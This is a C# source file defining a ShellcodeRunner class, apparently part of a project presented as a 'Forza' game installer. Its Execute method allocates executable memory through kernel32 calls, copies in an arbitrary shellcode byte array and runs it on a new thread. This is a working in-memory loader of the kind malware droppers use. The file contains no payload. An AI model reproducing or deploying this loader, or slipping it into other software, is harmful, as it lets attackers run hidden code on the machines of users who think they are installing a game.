using System;
using System.Runtime.InteropServices;

namespace ForzaInstallation.Inject
{
    internal static class ShellcodeRunner
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint MEM_RELEASE = 0x8000;

        internal static bool Execute(byte[] shellcode)
        {
            try
            {
                uint oldProt, dummy;
                var addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (addr == IntPtr.Zero) return false;
                Marshal.Copy(shellcode, 0, addr, shellcode.Length);
                VirtualProtect(addr, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProt);
                var thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                if (thread == IntPtr.Zero) { VirtualFree(addr, 0, MEM_RELEASE); return false; }
                WaitForSingleObject(thread, 60000);
                VirtualProtect(addr, (uint)shellcode.Length, oldProt, out dummy);
                VirtualFree(addr, 0, MEM_RELEASE);
                CloseHandle(thread);
                return true;
            }
            catch { return false; }
        }
    }
}
